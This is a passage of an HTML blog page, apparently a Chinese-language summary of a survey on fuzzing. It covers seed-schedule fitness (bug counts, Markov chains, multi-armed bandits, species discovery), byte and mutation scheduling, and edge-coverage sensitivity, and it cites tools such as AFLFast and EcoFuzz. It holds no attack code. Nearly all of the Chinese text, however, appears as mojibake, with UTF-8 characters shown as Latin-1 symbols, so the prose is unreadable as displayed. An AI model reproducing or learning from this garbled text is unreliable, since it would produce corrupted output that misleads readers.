title="3.2.1 Fitness by #Bugs"></a><em>3.2.1 Fitness by #Bugs</em></h3><p>é€šå¸¸è€Œè¨€åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­ä½¿ç”¨ä¸¤ç§ fitness è¿›è¡Œä¼˜åŒ–ï¼š1ï¼‰åŸºäºæ¼æ´ 2ï¼‰åŸºäºæ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚ä»£ç è¦†ç›–ç‡ï¼‰</p><p>ç”±äº fuzzing çš„ç›®çš„æ˜¯å‘ç°æ¼æ´ï¼Œå‘ç°æ¼æ´çš„æ•°é‡ä¾¿æ˜¯ä¸€ç§æœ€ç®€å•çš„ fitnessï¼Œä¸€ç§æ–¹æ³•ä¾¿æ˜¯åœ¨éšæœº&#x2F;é¡ºåºé€‰æ‹©ç§å­çš„æ—¶å€™è°ƒåº¦æ¯ä¸ªç§å­çš„æ—¶é—´é¢„ç®—ï¼Œåœ¨ä¸è€ƒè™‘æ‰§è¡ŒçŠ¶æ€çš„æƒ…å†µä¸‹ï¼Œ <em>æœ€å¤§åŒ–æ¼æ´æ•°é‡é—®é¢˜</em>  å¯ä»¥è¢«ç®€åŒ–ä¸ºä¸€ä¸ª <strong>æ•´æ•°çº¿æ€§è§„åˆ’</strong>ï¼ˆInteger Linear Programmingï¼ŒILPï¼‰é—®é¢˜ï¼Œå³åœ¨çº¿æ€§çº¦æŸä¸‹æœ€å¤§åŒ–æ¼æ´æ•°é‡â€”â€”ä»¥è§£å†³è¿™æ ·çš„ ILP é—®é¢˜æ¥è‡ªåŠ¨è®¡ç®—æ¯ä¸ªç§å­çš„æ—¶é—´é¢„ç®—</p><p>å¦å¤–ä¸€ç§è®¤çŸ¥æ˜¯å°†æ¼æ´å‘ç°çš„è¿‡ç¨‹è§†ä½œ <strong>å¸¦æƒå¥–åˆ¸æ”¶é›†é—®é¢˜</strong>ï¼ˆWeighted Coupon Collectorâ€™s Problemï¼Œ<del>ä¸æ‡‚çš„å»ºè®®ç¿»æ¦‚ç‡è®ºè¯¾æœ¬è™½ç„¶ğŸ‘´çš„æ¦‚ç‡è®ºä¹Ÿæ˜¯æŒ‚å¾—ä¸€å¡Œç³Šæ¶‚</del>ï¼‰ï¼šfuzzing ä¸­å‘ç°çš„æ¯ä¸ªç‹¬ç‰¹çš„æ¼æ´éƒ½è¢«è§†ä½œä¸€ç§â€œå¥–åˆ¸â€ï¼ŒWCCP æœŸæœ›ä»¥æ­¤é¢„æµ‹å‘ç°ä¸‹ä¸ªâ€œå¥–åˆ¸â€æ‰€éœ€è¦çš„å°è¯•çš„æ•°é‡ï¼ˆæ—¶é—´é¢„ç®—ï¼‰</p><p>ILP ä¸ WCCP éƒ½æ˜¯ä¸ºäº†å°†æ›´å¤šçš„æ—¶é—´äºæ˜¯åˆ†é…ç»™æ›´æœ‰æ½œåŠ›çš„ç§å­ä»¥å‘ç°æ›´å¤šæ¼æ´</p><h3 id="3-2-2-Fitness-by-State-Transitionï¼ˆMarkov-Chainï¼‰"><a href="#3-2-2-Fitness-by-State-Transitionï¼ˆMarkov-Chainï¼‰" class="headerlink" title="3.2.2 Fitness by State Transitionï¼ˆMarkov Chainï¼‰"></a><em>3.2.2 Fitness by State Transitionï¼ˆMarkov Chainï¼‰</em></h3><p>ç”±äºæ¼æ´åœ¨ PUTs ä¸­çš„åˆ†å¸ƒæ˜¯åˆ†æ•£çš„ï¼Œè‹¥ä»¥å·²å‘ç°æ¼æ´ä¸º fitnessï¼Œåˆ™ fuzzing åªä¼šå…³æ³¨ä¸å·²å‘ç°æ¼æ´ç›¸å…³çš„ä»£ç åŒºåŸŸï¼Œè¿™æœ‰å¯èƒ½æ— æ³•è·å¾—æ›´å¤šçš„ä»£ç è¦†ç›–ï¼Œè¿™ç§æƒ…å†µä¸‹éœ€è¦å¤æ‚æ¡ä»¶çš„ <em>æ·±å±‚æ¼æ´</em> åˆ™èƒ½é€ƒè¿‡ fuzzer çš„æ³•çœ¼</p><p>ä¸ºäº†ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œfuzzer åŸºäº<strong>æ‰§è¡ŒçŠ¶æ€</strong>ï¼ˆexecution stateï¼Œä¾‹å¦‚ä»£ç è¦†ç›–ç‡ï¼‰è®¡ç®— fitnessï¼Œå› ä¸ºæ‰§è¡ŒçŠ¶æ€èƒ½æä¾›æ›´å¤šçš„ä¿¡æ¯ï¼›ç°æœ‰çš„ fuzzer é€šå¸¸ä½¿ç”¨ä»£ç è¦†ç›–ç‡æ¥è®¡ç®— fitnessï¼Œå› ä¸ºæ›´é«˜çš„ä»£ç è¦†ç›–ç‡æ„å‘³ç€æ›´é«˜çš„å‘ç°æ¼æ´çš„å¯èƒ½æ€§</p><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œè‹¥æ¨¡ç³Šæµ‹è¯•èƒ½æˆåŠŸåœ°è¡¨ç¤ºçŠ¶æ€è¿ç§»ï¼Œå…¶èƒ½é«˜æ•ˆåœ°æŒ‡å¼•æ¨¡ç³Šæµ‹è¯•ä»¥æ¢ç´¢æœªå‘ç°çš„çŠ¶æ€ï¼Œä¸€ä¸ªçƒ­é—¨çš„å»ºæ¨¡æ–¹æ³•ä¾¿æ˜¯ <strong>é©¬å°”ç§‘å¤«é“¾</strong>ï¼ˆMarkov Chainï¼‰ï¼Œå…¶ä¸­ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯å°† CFGs ä¸­çš„ä¸€ä¸ªåŸºæœ¬å—è§†ä½œä¸€ä¸ªçŠ¶æ€ï¼ŒçŠ¶æ€è½¬ç§»å³ä¸ºåŸºæœ¬å—çš„æ‰§è¡Œè¿ç§»ï¼Œfuzzer é€šè¿‡åœ¨ fuzzing è¿‡ç¨‹ä¸­è®°å½•åŸºæœ¬å—çš„è·³è½¬é¢‘ç‡æ¥è®¡ç®—æ¦‚ç‡</p><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œé©¬å°”ç§‘å¤«é“¾ç»´æŠ¤ä¸€ä¸ªæ¦‚ç‡è¡¨ï¼ˆprobability tableï¼‰ï¼Œå…ƒç´  <em>p<sub>ij</sub></em> è¡¨ç¤ºä»çŠ¶æ€ <em>i</em> è½¬ç§»åˆ°çŠ¶æ€ <em>j</em> çš„æ¦‚ç‡</p><p><img src="https://s2.loli.net/2022/10/26/NFoAY1aEyUGvxVi.png" alt="image.png"></p></blockquote><p>æœ‰äº†åŸºäºé©¬å°”ç§‘å¤«é“¾è®¡ç®—çš„ fitnessï¼Œfuzzer å¯ä»¥æŒ‡å¯¼ç®—åŠ›çš„åˆ†é…ï¼Œæˆ–æ˜¯é€‰æ‹©ä½¿ç”¨ç¬¦å·æ‰§è¡Œè§£å†³æœ€å›°éš¾çš„è·¯å¾„ï¼ˆæœ€ä½çš„è½¬ç§»æ¦‚ç‡ï¼‰ï¼›é€šå¸¸è€Œè¨€ï¼Œè½¬ç§»æ¦‚ç‡è¶Šä½ï¼Œfitness è¶Šå¥½ï¼Œå› ä¸ºèƒ½è½»æ˜“åˆ°è¾¾çš„ä»£ç åŒºåŸŸä¼šæ¯”éš¾ä»¥åˆ°è¾¾çš„åŒºåŸŸæ›´å®¹æ˜“è¢«å……åˆ†æ¢ç´¢</p><p>åŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•ä¸­é€šè¿‡å¯¹ç§å­è¿›è¡Œå˜å¼‚ç”Ÿæˆæ–°çš„è¾“å…¥ï¼Œæ¯æ¬¡è¾“å…¥è¿è¡Œäº†ä¸€æ¡æ‰§è¡Œé“¾ï¼Œè¿™æä¾›äº†å¦ä¸€ç§åŸºäºé©¬å°”ç§‘å¤«é“¾çš„è§†è§’ï¼šçŠ¶æ€è¢«å®šä¹‰ä¸ºä¸€ä¸ªè¾“å…¥çš„ä¸€æ¡æ‰§è¡Œè·¯å¾„ï¼ŒçŠ¶æ€è½¬ç§»åˆ™ä¸ºå¯¹è¾“å…¥ <em>t<sub>i</sub></em> çš„å˜å¼‚ï¼Œç”Ÿæˆæ–°çš„è¾“å…¥ <em>t<sub>j</sub></em> ï¼Œå³ç”±è·¯å¾„ <em>i</em> è¿ç§»åˆ°è·¯å¾„  <em>j</em> ï¼Œfuzzer åœ¨ fuzzing è¿‡ç¨‹ä¸­åŠ¨æ€è®¡ç®—è·¯å¾„è¿ç§»çš„æ¦‚ç‡</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://ieeexplore.ieee.org/abstract/document/8233151">AFLFast</a></p></blockquote><h3 id="3-2-3-Fitness-by-State-Transitionï¼ˆMulti-Armed-Banditï¼‰"><a href="#3-2-3-Fitness-by-State-Transitionï¼ˆMulti-Armed-Banditï¼‰" class="headerlink" title="3.2.3 Fitness by State Transitionï¼ˆMulti-Armed Banditï¼‰"></a><em>3.2.3 Fitness by State Transitionï¼ˆMulti-Armed Banditï¼‰</em></h3><p>é©¬å°”ç§‘å¤«é“¾éœ€è¦åŸºäºå¯¹æ‰€æœ‰çŠ¶æ€å·²çŸ¥æ¥åšå‡ºåˆé€‚é€‰æ‹©ï¼Œä½†åœ¨ fuzzing è¿‡ç¨‹ä¸­å¹¶éæ‰€æœ‰çŠ¶æ€éƒ½å·²è¢«æ‰§è¡Œï¼Œå› æ­¤é©¬å°”ç§‘å¤«é“¾å¹¶éæœ€ä¼˜è§£</p><p>å¯¹äºåŸºæœ¬å—è½¬ç§»ï¼Œå¯ä»¥åœ¨æ•°æ®ç»Ÿè®¡ä¸­ä½¿ç”¨ <em>rule of three</em> ï¼ˆğŸ‘´ä¹Ÿä¸çŸ¥é“å•¥ç©æ„ï¼Œå¦¹æŸ¥åˆ°ï¼‰ï¼›å¯¹äºè·¯å¾„è½¬ç§»ï¼Œå¯ä»¥ä½¿ç”¨è½®è¯¢è°ƒåº¦ç®—æ³•å°†æ—¶é—´é¢„ç®—å¹³å‡åˆ†é…ç»™æ¯ä¸ªç§å­ï¼Œç„¶è€Œè¿™ç§æ–¹æ³•æ— æ³•å†³å®šä»€ä¹ˆæ—¶å€™ä»è½®è¯¢è°ƒåº¦åˆ‡æ¢åˆ°é©¬å°”ç§‘å¤«é“¾â€”â€”åœ¨éå†æ‰€æœ‰ç§å­ä¸å…³æ³¨ç‰¹ç‚¹ç§å­é—´è¿›è¡Œå¹³è¡¡ï¼Œè¿™ä¾¿æ˜¯ä¸€ä¸ªç»å…¸çš„ <code>exploration vs. exploitation</code> é—®é¢˜</p><p>ä¸€ä¸ªæ›´å¥½çš„è§£å†³  <code>exploration vs. exploitation</code>  é—®é¢˜çš„æ–¹æ³•ä¾¿æ˜¯ä½¿ç”¨ <strong>å¤šè‡‚è€è™æœº</strong>ï¼ˆMulti-Armed Banditï¼ŒMABï¼Œ<del>åˆåˆ°äº†æ¦‚ç‡è®ºå­¦å¾—ç¨€çƒ‚çš„ğŸ‘´æ‰£é—®å·çš„æ—¶é—´</del>ï¼‰è¡¨ç¤ºè·¯å¾„è½¬ç§»ï¼šç§å­ <em>t<sub>i</sub></em> è¢«è§†ä½œä¸€æ¡â€œè‡‚â€ï¼Œâ€œå¥–åŠ±â€åˆ™æ˜¯ç”±ç§å­ <em>t<sub>i</sub></em> ç”Ÿæˆçš„ä¸€æ¡æ–°è·¯å¾„çš„å‘ç°</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/yue">EcoFuzz</a></p></blockquote><h3 id="3-2-4-Fitness-by-State-Discovery"><a href="#3-2-4-Fitness-by-State-Discovery" class="headerlink" title="3.2.4 Fitness by State Discovery"></a><em>3.2.4 Fitness by State Discovery</em></h3><p>é©¬å°”ç§‘å¤«é“¾ä¸å¤šè‡‚è€è™æœºéƒ½èƒ½è¡¨ç¤ºç¨‹åºçš„çŠ¶æ€è¿ç§»ï¼Œç„¶è€Œæ¨¡ç³Šæµ‹è¯•çš„åŸºæœ¬ç›®æ ‡æ˜¯å‘ç°æ–°çš„çŠ¶æ€ï¼ˆæ–°çš„ä»£ç è¦†ç›–ç‡ã€æ–°çš„æ¼æ´ã€æ–°çš„å´©æºƒï¼‰ï¼Œç”±æ­¤æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ª <strong>ç‰©ç§å‘ç°é—®é¢˜</strong>ï¼ˆspecies discovery problemï¼‰ï¼š <em>ç”Ÿæ€å­¦å®¶ä»é‡å¤–æ”¶é›†å¤§é‡æ ·æœ¬ï¼Œæ ·æœ¬ä¸­çš„ç‰©ç§å¯èƒ½ä¸°å¯Œæˆ–ç¨€å°‘ï¼Œç”Ÿæ€å­¦å®¶ä»¥æ­¤æ¨æ–­é›†èšçš„æ€§è´¨ï¼ŒåŒ…æ‹¬æœªå‘ç°çš„æ ·æœ¬</em> â€”â€”ç±»ä¼¼åœ°ï¼Œ<strong>ç”± fuzzer ç”Ÿæˆçš„è¾“å…¥å³ä¸ºâ€œå·²æ”¶é›†åˆ°çš„æ ·æœ¬â€ï¼Œè¾“å…¥ç©ºé—´å³ä¸ºâ€œé›†èšâ€ï¼ˆassemblageï¼‰</strong>ï¼Œfuzzing åŸºäºç‰¹å®šæ ‡å‡†å°†è¾“å…¥è¿›è¡Œåˆ†ç±»</p><blockquote><p>ä¾‹å¦‚ä¸€æ¡æ‰§è¡Œè·¯å¾„å¯ä»¥æ˜¯ä¸€ä¸ªç‰©ç§ï¼Œæ‰§è¡Œè¿™æ¡è·¯å¾„çš„è¾“å…¥å±äºè¯¥ç‰©ç§ï¼Œä¸€ä¸ªç¨€æœ‰ç‰©ç§å³ä¸ºè¾ƒå°‘è¾“å…¥æ‰§è¡Œåˆ°çš„è·¯å¾„ï¼Œè¿™å¼•å¯¼ç€ fuzzer å»å‘ç°æ–°çš„â€œç‰©ç§â€â€”â€”æ–°çš„è·¯å¾„â†’æ–°çš„çŠ¶æ€</p></blockquote><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://mboehme.github.io/paper/FSE20.Entropy.pdf">Entropic</a></p></blockquote><h2 id="3-3-Byte-Schedule"><a href="#3-3-Byte-Schedule" class="headerlink" title="3.3 Byte Schedule"></a>3.3 Byte Schedule</h2><p><strong>å­—èŠ‚è°ƒåº¦</strong>ï¼ˆByte Scheduleï¼‰å†³å®šäº† <em>é€‰æ‹©ç§å­ä¸­ä¸€ä¸ªå­—èŠ‚æ¥å˜å¼‚</em> çš„é¢‘ç‡ã€‚å¤§éƒ¨åˆ† fuzzer åŸºäºæ‰§è¡Œä¿¡æ¯æ¥è¯•æ¢æ€§åœ°æˆ–éšæœºåœ°é€‰æ‹©å­—èŠ‚ï¼Œè¿™éœ€è¦æ¯” seed schedule å¯¹ç¨‹åºè¡Œä¸ºæœ‰ç€æ›´æ·±åˆ»çš„äº†è§£ï¼ˆä¾‹å¦‚è·¯å¾„çº¦æŸæˆ–æ•°æ®æµï¼‰ï¼Œç”±æ­¤ fuzzer å¯ä»¥å…³æ³¨äºä¸€ä¸ªä¸é‚£ä¹ˆå¤æ‚çš„é—®é¢˜â€”â€”å­—èŠ‚å¦‚ä½•å½±å“æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼Œç§°ä¸ºå­—èŠ‚çš„<strong>é‡è¦æ€§</strong>ï¼ˆimportanceï¼‰</p><p>ç”±äºå¤§éƒ¨åˆ†ç°ç›’ fuzzer ä½¿ç”¨ <em>è¾¹è¦†ç›–ç‡</em> æ¥æµ‹è¯• PUTsï¼Œç¬¬ä¸€ç§æ–¹æ³•ä¾¿æ˜¯å°†é‡è¦æ€§å®šä¹‰ä¸º <em>å­—èŠ‚å¦‚ä½•å½±å“åˆ†æ”¯è¡Œä¸º</em></p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š<a href="https://arxiv.org/abs/1807.05620">NEUZZ</a>ã€<a href="https://arxiv.org/abs/2005.12392">MTFuzz</a></p></blockquote><p>å¦ä¸€ç§é‡åŒ–å­—èŠ‚çš„é‡è¦æ€§çš„æ–¹æ³•æ˜¯åŸºäºç§å­çš„ fitness è¿›è¡Œå®šä¹‰ï¼Œåœ¨ fuzzing è¿‡ç¨‹ä¸­å¯ä»¥å…³æ³¨èƒ½æå‡ fitness çš„å­—èŠ‚ï¼šè‹¥å¯¹äºä¸€ä¸ªå­—èŠ‚çš„æ”¹å˜æå‡äº†ç§å­çš„ fitnessï¼Œåˆ™å¢åŠ è¯¥ç§å­çš„åˆ†æ•°</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™ä¸ªä¾‹å­ï¼š<a href="https://dl.acm.org/doi/10.1145/3460120.3484596">AFLChurn</a></p></blockquote><h2 id="3-4-Mutation-Operator-Schedule"><a href="#3-4-Mutation-Operator-Schedule" class="headerlink" title="3.4 Mutation Operator Schedule"></a>3.4 Mutation Operator Schedule</h2><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œè¾“å…¥ç”Ÿæˆå™¨çš„æœ€åä¸€æ­¥æ˜¯é€‰æ‹©ä¸€ä¸ªå˜å¼‚å™¨ï¼ˆmutation operatorï¼Œå³mutatorï¼‰æ¥å¯¹é€‰æ‹©çš„å­—èŠ‚è¿›è¡Œå˜å¼‚ï¼Œ<strong>å˜å¼‚è°ƒåº¦</strong>ï¼ˆmutation scheduleï¼‰å†³å®šäº†ä¸‹æ¬¡å˜å¼‚æ‰€ç”¨çš„å˜å¼‚å™¨</p><blockquote><p>è®ºæ–‡ç»™å‡ºäº†è¿™äº›ä¾‹å­ï¼š</p><ul><li><a href="https://dl.acm.org/doi/10.1145/2908080.2908095">Classfuzz</a>ï¼šä½¿ç”¨ <em>é©¬å°”ç§‘å¤«é“¾è’™ç‰¹å¡æ´›æ–¹æ³•</em> ï¼ˆMarkov chain Monte Carloï¼‰ å»ºæ¨¡å˜å¼‚è°ƒåº¦</li><li><a href="">MOPT</a>ï¼šä½¿ç”¨ <em>ç²’å­ç¾¤ä¼˜åŒ–</em> ï¼ˆParticle swarm optimizationï¼‰å»ºæ¨¡å˜å¼‚é€‰æ‹©è¿‡ç¨‹</li></ul></blockquote><h2 id="3-5-Diverse-Information-For-Fitness"><a href="#3-5-Diverse-Information-For-Fitness" class="headerlink" title="3.5 Diverse Information For Fitness"></a>3.5 Diverse Information For Fitness</h2><p>Fitness é™¤äº†è°ƒåº¦ç§å­ã€å­—èŠ‚ã€å˜å¼‚å™¨ä»¥å¤–ï¼Œè¿˜å¯ä»¥è¢«ç”¨äºæŒ‡å¯¼ç§å­å­˜ç•™ï¼šè¾“å…¥ç”±ç§å­å˜å¼‚è€Œæ¥ï¼Œè‹¥ä¸€ä¸ªè¾“å…¥æ¢ç´¢åˆ°æ–°çš„æ‰§è¡ŒçŠ¶æ€ï¼Œå…¶ä¾¿è¢«ä¿ç•™ä¸ºæ–°çš„ç§å­ï¼Œåœ¨ç§å­è°ƒåº¦ä¸­å¸¸é€‰æ‹©æ–°çš„ç§å­ï¼›å¤§éƒ¨åˆ†çš„è¦†ç›–ç‡æŒ‡å¯¼çš„ fuzzer åŸºäºè¾¹è¦†ç›–ç‡æ¥ä¿ç•™ç§å­</p><p>ä¸ºäº†æé«˜å‘ç°æ¼æ´çš„èƒ½åŠ›ï¼Œéœ€è¦æ›´æ•æ„Ÿçš„ä»£ç è¦†ç›–ç‡å¸¦æ¥æ›´å¤šçš„æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯ï¼›å¦ä¸€æ–¹é¢ï¼Œæ–°ç±»å‹çš„ fitness ä¹Ÿè¢«ä¸ºä¸€äº›ç‰¹æ®Šåœºæ™¯è®¾è®¡äº†å‡ºæ¥ï¼Œä¾‹å¦‚æ·±åº¦å­¦ä¹ æ¨¡å‹æˆ–æœºå™¨è£…ç½®</p><p><img src="https://s2.loli.net/2022/10/26/PbVfo5HKp9e6aBy.png" alt="Fig. 3. Sensitivity and limitation of code coverage."></p><h3 id="3-5-1-Sensitive-Code-Coverage"><a href="#3-5-1-Sensitive-Code-Coverage" class="headerlink" title="3.5.1 Sensitive Code Coverage"></a>3.5.1 Sensitive Code Coverage</h3><p>fitness çš„æ•æ„Ÿåº¦æ ‡è¯†åŒºåˆ†æ‰§è¡ŒçŠ¶æ€çš„èƒ½åŠ›ï¼Œå¤§éƒ¨åˆ†è¦†ç›–ç‡æŒ‡å¯¼çš„ fuzzer ä½¿ç”¨ä¸€ä¸ªä½å›¾æ¥æä¾›è¾¹è¦†ç›–ç‡ä¿¡æ¯ï¼š</p><ul><li>ä½å›¾ä¸­çš„æ¯ä¸ªå…ƒç´ ä¸‹æ ‡è¡¨ç¤ºä¸€ä¸ªè¾¹æ ‡è¯†ç¬¦ï¼ˆedge identifierï¼‰ï¼Œå¹¶ä¸ºè¾¹æ ‡è¯†ç¬¦è®¡ç®—å“ˆå¸Œå€¼ <em>hash(b<sub>i</sub>, b<sub>j</sub>)</em> ï¼Œå…¶ä¸­ <em>b<sub>i</sub></em> ä¸ <em>b<sub>j</sub></em> ä¸ºéšæœºæŒ‡æ´¾çš„åŸºæœ¬å—æ ‡è¯†ç¬¦ï¼ˆblock identifierï¼‰</li></ul><p>å°½ç®¡è¿™ç§æ–¹æ³•æ‰§è¡Œå¾—å¾ˆå¿«ï¼Œä½†å…¶èˆå¼ƒäº†å¯¹è¾¹è¦†ç›–ç‡çš„é¢„æµ‹ï¼ŒåŒæ—¶è¿™ç§ç»´æŠ¤è¾¹è¦†ç›–ç‡çš„å®ç°å¯¼è‡´äº†<strong>è¾¹ç¢°æ’</strong>ï¼ˆedge collisionï¼‰é—®é¢˜ï¼ˆä¾‹å¦‚ä¸¤æ¡ä¸åŒçš„è¾¹è¢«åˆ†é…äº†åŒä¸€ä¸ªæ ‡è¯†ç¬¦ï¼‰ï¼Œä¸ºäº†åˆ†é…å”¯ä¸€çš„è¾¹æ ‡è¯†ç¬¦ï¼Œfuzzer éœ€è¦å°å¿ƒåœ°åˆ†é…å—æ ‡è¯†ç¬¦ä¸”æä¾›æ›´ç²¾ç¡®çš„å“ˆå¸Œå‡½æ•°</p><blockquote><p>å¦‚ Fig3.a æ‰€ç¤ºï¼Œè‹¥ <em>id<sub>AB</sub></em> &#x3D;&#x3D; <em>id<sub>AC</sub></em> ä¸”  <em>id<sub>BD</sub></em> &#x3D;&#x3D; <em>id<sub>CD</sub></em> ï¼Œåˆ™è·¯å¾„ <code>ABD</code> ä¸ <code>ACD</code> è¢«å½“ä½œåŒä¸€æ¡è·¯å¾„ï¼Œåœ¨è¿™ç§è®¾æƒ³ä¸‹ fuzzer æ— æ³•è·å¾—æ–°çš„è¦†ç›–ç‡ï¼Œå…¶ä¼š<strong>å¿½ç•¥</strong>æ¼æ´è·¯å¾„ <code>ACDEG</code></p></blockquote><p>Fuzzer é€šè¿‡ä½å›¾ä¾¿èƒ½ç¡®å®šä¸€ä¸ªè¾“å…¥æ˜¯å¦äº§ç”Ÿäº†æ–°çš„è¾¹ï¼›ç‰¹åˆ«åœ°ï¼Œfuzzer ç»´æŠ¤ä¸€ä¸ªæ€»ä½“ä½å›¾ï¼ˆoverall bitmapï¼Œç‹¬ç«‹æ‰§è¡Œä½å›¾ï¼ˆbitmap of individual executionï¼‰çš„é›†åˆï¼‰ï¼Œåœ¨ç¡®å®šæ–°çš„è¾¹æ—¶ï¼Œfuzzer å°†ç‹¬ç«‹ä½å›¾ä¸æ€»ä½“ä½å›¾å¯¹æ¯”ï¼Œä»¥æ£€æŸ¥è¿™æ¡æ–°çš„è¾¹æ˜¯å¦å­˜åœ¨äºç‹¬ç«‹ä½å›¾ä¸­ï¼Œç„¶è€Œä½å›¾é›†åˆä¸§å¤±äº†æ‰§è¡Œä¿¡æ¯</p><blockquote><p>ä¾‹å¦‚è‹¥ Fig3.a ä¸­çš„è·¯å¾„ <code>ABDEG</code> ä¸ <code>ACDFG</code> å·²ç»è¢«è®­ç»ƒï¼Œåˆ™æ–°çš„è¾¹ <code>ACDEG</code> å°†ä¸ä¼šè¢«ä½œä¸ºæ–°çš„ç§å­ä¿ç•™ï¼Œå› ä¸ºåœ¨æ€»ä½“ä½å›¾ä¸­æ—©å·²å­˜åœ¨æ‰€æœ‰çš„è¾¹</p></blockquote><p>ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯ç ”ç©¶ç‹¬ç«‹ä½å›¾çš„èåˆï¼Œä½†ç”±äºèåˆä½å›¾ä¼šå¸¦æ¥å¤ªå¤šçš„ç§å­ï¼Œè¿™éœ€è¦åœ¨ fuzzing æ•ˆç‡ä¸æ•æ„Ÿè¦†ç›–ç‡é—´å¹³è¡¡ï¼Œä¸€ä¸ªæ½œåœ¨çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨<strong>åŠ¨æ€ä¸»æˆåˆ†åˆ†æ</strong>ï¼ˆdynamic principle component analysisï¼‰æ¥å‡å°‘æ•°æ®é›†çš„ç»´åº¦ï¼Œå…¶ä»–çš„è§£å†³æ–¹æ¡ˆåˆ™æ˜¯ä¸ºè¾¹è¦†ç›–ç‡æä¾›é¢å¤–ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šè¾¹å“ˆå¸Œï¼ˆedge hashï¼‰ã€è°ƒç”¨ä¸Šä¸‹æ–‡ï¼ˆcalling contextï¼‰ã€å¤šçº§è¦†ç›–ç‡ï¼ˆmultilevel coverageï¼‰ã€ä»£ç å¤æ‚åº¦ï¼ˆcode complexityï¼‰</p><p>å¯¹ä½å›¾çš„æ”¹è¿›å…³æ³¨äºæœå¯»æ›´å¤šçš„ä»£ç è¦†ç›–ï¼Œç„¶è€Œè¿™æ ·çš„æ”¹è¿›å¯èƒ½æ²¡æ³•æ¢ç´¢å¤æ‚çš„æ‰§è¡ŒçŠ¶æ€ï¼Œå› æ­¤ä¸€ä¸ªæœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆä¾¿æ˜¯é€šè¿‡<strong>äººä¸ºç›‘ç£</strong>ï¼ˆhuman-in-the-loopï¼‰æ¥æŒ‡å¯¼å¯¹å¤æ‚æ‰§è¡ŒçŠ¶æ€çš„æ¢ç´¢</p><blockquote><p>ä¾‹å¦‚ Fig3.b ä¸ºä¸€æ®µè¿·å®«ä»£ç ï¼Œ<code>(a,b)</code> ä»£è¡¨åœ¨è¿·å®«ä¸­çš„ä½ç½®ï¼Œä¸ºäº†è§¦å‘ <code>bug()</code>ï¼Œ<code>(a,b)</code> åº”å½“æœ‰ç€ç‰¹å®šçš„å€¼ï¼Œç„¶è€Œ <code>switch</code> ä»…æœ‰å››æ¡è¾¹ï¼Œå¯ä»¥è¢«å¿«é€Ÿéå†ï¼Œåœ¨è¿™ä¹‹å fuzzing ä¾¿å¤±å»äº†å¯¹åˆ°è¾¾æ¼æ´ä½ç½®çš„æŒ‡å¼•ï¼›æ­¤æ—¶åˆ†æè€…å¯ä»¥è®©æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹æ¢ç´¢ <code>(a,b)</code> çš„ä¸åŒå€¼</p></blockquote><p>æ­¤å¤–ï¼Œæ¯”è¾ƒæ¡ä»¶çš„å€¼æ¯”äºŒè¿›åˆ¶ç»“æœæ›´åŠ æ•æ„Ÿï¼Œå³ <code>examined</code> æˆ– <code>not examined</code></p><blockquote><p>ä¾‹å¦‚ Fig3.a ä¸­è‹¥ <code>(x[3] - 0x44)</code> çš„å€¼æ˜¯å¯çŸ¥çš„ï¼Œåˆ™ fuzzer ä¾¿èƒ½é€‰æ‹©æ›´èƒ½æ»¡è¶³æ¡ä»¶ <code>if (x[3] == 0x44)</code> çš„ç§å­</p></blockquote><h3 id="3-5-2-Diverse-Fitness"><a href="#3-5-2-Diverse-Fitness" class="headerlink" title="3.5.2 Diverse Fitness"></a>3.5.2 Diverse Fitness</h3><p>ç”±äºæ¨¡ç³Šæµ‹è¯•å¯ç”¨æ¥æ£€æµ‹å¤šç§åº”æœ‰çš„ç¼ºé™·ï¼Œè€Œä»£ç è¦†ç›–å¯¹äºæ¨¡ç³Šæµ‹è¯•è€Œè¨€å¹¶éä¸€ç›´éƒ½æ˜¯æœ€å¥½çš„åé¦ˆï¼Œå› æ­¤å¤šç§ç±»å‹çš„ fitness è¢«é’ˆå¯¹ç‰¹å®šçš„åº”ç”¨ç¨‹åºæˆ–ç¼ºé™·è®¾è®¡äº†å‡ºæ¥ï¼š</p><ul><li><p><em>Legality of execution result</em> ï¼šä¸€é—¨ OOP è¯­è¨€ï¼ˆæ¯”å¦‚ Javaï¼‰ç”±ä¸€ä¸ªæ–¹æ³•è°ƒç”¨åºåˆ—ç»„æˆï¼Œéæ³•çš„æ‰§è¡Œç»“æœä¼šæŠ›å‡ºå¼‚å¸¸ï¼›åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆå¹¶ç»´æŠ¤èƒ½æ¢ç´¢æ›´å¤šæ–°çš„åŠåˆæ³•çš„ç›®æ ‡çŠ¶æ€çš„æ–°çš„è°ƒç”¨åºåˆ—</p></li><li><p><em>State Machine of protocol implementations</em> ï¼šç”±äºåè®®çš„å¤æ‚æ€§ï¼Œfuzzer 